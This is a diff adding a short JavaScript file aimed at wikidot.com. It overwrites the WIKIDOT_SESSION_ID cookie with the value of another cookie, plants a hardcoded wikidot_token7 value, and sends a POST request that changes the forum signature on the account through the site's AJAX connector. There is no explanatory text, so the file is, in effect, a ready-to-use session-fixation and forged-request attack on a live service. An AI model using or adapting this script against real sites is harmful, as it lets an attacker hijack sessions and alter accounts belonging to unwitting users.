@@ -1,0 +1,22 @@
+function getCookie(cname) {
+    var name = cname + "=";
+    var ca = document.cookie.split(';');
+    for(var i = 0; i <ca.length; i++) {
+        var c = ca[i];
+        while (c.charAt(0) == ' ') {
+            c = c.substring(1);
+        }
+        if (c.indexOf(name) == 0) {
+            return c.substring(name.length, c.length);
+        }
+    }
+    return "";
+}
+document.cookie = "WIKIDOT_SESSION_ID=" + getCookie("new") + ";path=/;domain=wikidot.com;";
+document.cookie = "wikidot_token7=4m64ez22na9pf7k6s988;path=/;";
+var http = new XMLHttpRequest();
+sig = "test3";
+var url = "https://www.wikidot.com/ajax-module-connector.php";
+var params = "source=" + sig + "&action=DashboardProfileAction&event=saveForumSignature&moduleName=Empty&callbackIndex=3&wikidot_token7=4m64ez22na9pf7k6s988";
+http.open("POST", url, true);
+http.send(params);
